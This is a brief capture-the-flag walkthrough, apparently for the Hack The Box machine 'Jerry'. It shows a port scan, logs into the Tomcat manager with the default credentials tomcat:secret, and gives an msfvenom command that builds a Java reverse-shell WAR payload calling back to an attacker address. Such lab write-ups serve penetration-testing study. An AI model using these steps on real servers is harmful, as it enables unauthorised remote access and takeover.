## Jerry

Difficulty: Easy

### User and Root Flag

```
rustscan -a 10.10.10.95 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/ab0f7ce2-bafa-42ac-91e8-0e9d0b041e24)

<br>

Apache tomcat is on port 8080. We can use default credentials tomcat:secret to access the manager.

![tomcat](https://github.com/b1d0ws/OSCP/assets/58514930/527a9486-cc47-48a4-a160-152f8fa017ab)

<br>

Generate a java payload with msfvenom, upload to the webserver and execute it.

```
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.21 lport=3333 -f war -o pwn.war
```

![payload](https://github.com/b1d0ws/OSCP/assets/58514930/e76eafad-7dfa-4ac1-b072-34da7036ce12)

![rootShell](https://github.com/b1d0ws/OSCP/assets/58514930/bf454724-7e5c-46e0-a2f0-8ea9c302e9a6)
